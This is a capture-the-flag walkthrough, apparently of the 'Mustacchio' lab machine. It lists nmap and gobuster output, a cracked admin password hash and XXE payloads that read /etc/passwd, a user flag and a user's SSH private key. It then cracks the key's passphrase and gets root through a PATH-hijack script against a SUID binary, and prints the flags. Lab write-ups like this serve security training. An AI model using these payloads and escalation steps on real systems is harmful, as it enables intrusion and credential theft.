ip address:10.10.164.85

Nmap:

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 58:1b:0c:0f:fa:cf:05:be:4c:c0:7a:f1:f1:88:61:1c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC2WTNk2XxeSH8TaknfbKriHmaAOjRnNrbq1/zkFU46DlQRZmmrUP0uXzX6o6mfrAoB5BgoFmQQMackU8IWRHxF9YABxn0vKGhCkTLquVvGtRNJjR8u3BUdJ/wW/HFBIQKfYcM+9agllshikS1j2wn28SeovZJ807kc49MVmCx3m1OyL3sJhouWCy8IKYL38LzOyRd8GEEuj6QiC+y3WCX2Zu7lKxC2AQ7lgHPBtxpAgKY+txdCCEN1bfemgZqQvWBhAQ1qRyZ1H+jr0bs3eCjTuybZTsa8aAJHV9JAWWEYFegsdFPL7n4FRMNz5Qg0BVK2HGIDre343MutQXalAx5P
|   256 3c:fc:e8:a3:7e:03:9a:30:2c:77:e0:0a:1c:e4:52:e6 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCEPDv6sOBVGEIgy/qtZRm+nk+qjGEiWPaK/TF3QBS4iLniYOJpvIGWagvcnvUvODJ0ToNWNb+rfx6FnpNPyOA0=
|   256 9d:59:c6:c7:79:c5:54:c4:1d:aa:e4:d1:84:71:01:92 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGldKE9PtIBaggRavyOW10GTbDFCLUZrB14DN4/2VgyL
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Mustacchio | Home

8765/tcp open  http    syn-ack nginx 1.10.3 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.10.3 (Ubuntu)
|_http-title: Mustacchio | Login

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


Gobuster:

/images (Status: 301)
/custom (Status: 301)
/fonts (Status: 301)


found users.bak that seems to be a db:

admin	1868e36a6d2b17d4c2745f1659433a54d4bc5f4b

dehash the passwd: 
john --wordlist=/usr/share/wordlists/rockyou.txt hash     
bulldog19 

Gobuster on 8765:
/assets (Status: 301)
/auth (Status: 301)


log in to the pannel with admin and bulldog19

view source page:
//document.cookie = "Example=/auth/dontforget.bak"; 
<!-- Barry, you can now SSH in using your key!-->

found XXE:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
   <!ELEMENT data ANY >
   <!ENTITY name SYSTEM "file:///etc/passwd" >]>
<comment>
  <name>&name;</name>
  <author>Barry Clad</author>
  <com>comments</com>
</comment>

modify the xxe in order to get user.txt

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
   <!ELEMENT data ANY >
   <!ENTITY name SYSTEM "file:///home/barry/user.txt" >]>
<comment>
  <name>&name;</name>
  <author>Barry Clad</author>
  <com>comments</com>
</comment>

User flag= 62d77a4d5f97d47c5aa38b3b2651b831

get id_rsa from barry:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
   <!ELEMENT data ANY >
   <!ENTITY name SYSTEM "file:///home/barry/.ssh/id_rsa" >]>
<comment>
  <name>&name;</name>
  <author>Barry Clad</author>
  <com>comments</com>
</comment>

get the id_rsa key and  use john to convert the key to a hash:
$ /usr/share/john/ssh2john.py id_rsa > hash

Crack the hash in order to get the passfrase: 
$ sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash

passfrase: urieljames  
$chmod 600 id_rsa


log in to ssh to barry:
ssh -i id_rsa barry@ip

get SUID binaries: find / -type f -perm -u=s 2>/dev/null

/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/at
/usr/bin/chsh
/usr/bin/newgidmap
/usr/bin/sudo
/usr/bin/newuidmap
/usr/bin/gpasswd
/home/joe/live_log
/bin/ping
/bin/ping6
/bin/umount
/bin/mount
/bin/fusermount
/bin/su

$strings /home/joe/live_log
Looks like it’s executing the tail command but is not using the absolute path, which is bad. We can exploit this as follows:
Go to /tmp and create a file named tail with the following content:
#!/bin/bash
cp /bin/bash /tmp/bash
chmod +s /tmp/bash

Add /tmp to $PATH using the following command:
export PATH=/tmp:$PATH

 Make the file executable:
chmod +x /tmp/tail
 Execute the SUID binary live_log:
 /home/joe/live_log

 type /tmp/bash -p and then type id to confirm you are root:
 cat /root/root.txt
3223581420d906c4dd1a5f9b530393a5



